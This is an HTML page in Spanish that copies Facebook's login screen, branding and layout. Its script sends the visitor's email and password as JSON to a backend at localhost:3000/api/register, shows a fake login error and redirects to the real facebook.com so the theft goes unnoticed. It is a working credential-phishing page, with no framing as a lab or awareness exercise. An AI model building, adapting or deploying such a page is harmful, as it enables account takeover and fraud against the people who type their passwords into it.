<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Iniciar sesión o registrarse</title>
    <link rel="stylesheet" href="frontend/styles.css">
</head>
<body>
    <div class="lang-bar">Español</div>
    <main style="margin-top:32px;">
        <div class="fb-logo-img" aria-hidden="true">
            <img src="backend/logo.png" alt="Facebook" width="60" height="60" style="display:block;border-radius:50%;box-shadow:0 2px 8px rgba(24,119,242,0.08);background:#1877f2;" />
        </div>
        <div style="height: 150px;"></div>
        <section class="login-card">
            <form id="loginForm" method="post" action="#" autocomplete="on">
                <div>
                    <input class="input-fb" type="text" id="email" name="email" autocomplete="username" required aria-label="Celular o correo electrónico" placeholder="Celular o correo electrónico">
                </div>
                <div>
                    <input class="input-fb" type="password" id="password" name="password" autocomplete="current-password" required aria-label="Contraseña" placeholder="Contraseña">
                </div>
                <button type="submit" class="fb-login-btn" id="loginBtn" aria-label="Iniciar sesión">Iniciar sesión</button>
            </form>
            <a href="#" class="fb-forgot" tabindex="0">¿Olvidaste tu contraseña?</a>
            <div style="height: 270px;"></div>
            <button type="button" class="fb-create-btn" aria-label="Crear cuenta nueva">Crear cuenta nueva</button>
            <div style="display:flex;flex-direction:column;align-items:center;margin-top:32px;gap:8px;">
                <img src="backend/meta.png" alt="Meta" width="60" height="24" style="margin-bottom:4px;opacity:0.8;" />
                <div style="color:#888;font-size:13px;display:flex;gap:18px;justify-content:center;">
                    <span>Información</span>
                    <span>Ayuda</span>
                    <span>Más</span>
                </div>
            </div>
        </section>
        <div class="fb-create-page">
            <a href="#" style="color:#1877f2; font-weight:bold; text-decoration:none;">Crea una página</a> para una celebridad, una marca o un negocio.
        </div>
    </main>
    <script>
        // Accesibilidad: focus visible en tab
        document.querySelectorAll('button, .fb-forgot').forEach(el => {
            el.addEventListener('keyup', e => {
                if (e.key === 'Tab') el.style.outline = '2px solid #1877f2';
            });
            el.addEventListener('blur', e => {
                el.style.outline = '';
            });
        });

        // Envío del formulario
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            loginBtn.disabled = true;
            loginBtn.textContent = 'Cargando...';
            // Guardar en backend
            await fetch('http://localhost:3000/api/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: email.value, password: password.value })
            });
            setTimeout(() => {
                alert('Error inicia sesion de nuevo');
                window.location.href = 'https://www.facebook.com/';
            }, 1000);
        });
    </script>
</body>
</html>
